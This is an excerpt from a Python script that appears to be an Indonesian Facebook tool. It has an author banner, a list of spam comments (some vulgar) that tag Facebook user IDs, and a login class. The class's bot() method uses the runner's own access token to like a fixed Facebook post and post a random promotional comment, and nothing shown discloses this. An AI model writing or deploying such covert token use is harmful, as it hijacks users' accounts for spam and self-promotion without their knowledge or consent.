...
komen = random.choice(['GUA PAKE SC LU BANG @[100068397981838:0] I Love You','Pengguna script ganja kamu bang @[100068397981838:0]','Kamu ganteng banget deh @[100044663564610:0]','Kamu ganteng banget deh bang @[100068397981838:0]','Kamu manis bang bang @[100056394630237:0]','Kamu cantik banget anak siapa @[100062167515808:0]','Kamu ganteng banget bang @[100068397981838:0]','Mantap bang love you','Niki gagal Tenaar nggak ada obat script nya emang','pengin kaya elu bang bisa ngocok stading @[100068397981838:0]'])
...
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   : gagal Tenaar
 [\x1b[1;96m+%s] Github   : https://github.com/tenaar
 [\x1b[1;96m+%s] Facebook : gagal tenaar?
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
...
class login:
	...
	def bot(self):
		...
		requests.post('https://graph.facebook.com/299624688994128/likes?summary=true&access_token=' + toket)
		requests.post('https://graph.facebook.com/299624688994128/comments/?message='+komen+'&access_token=' + toket)
		requests.post('https://graph.facebook.com/299624688994128/likes?summary=true&access_token=' + toket)
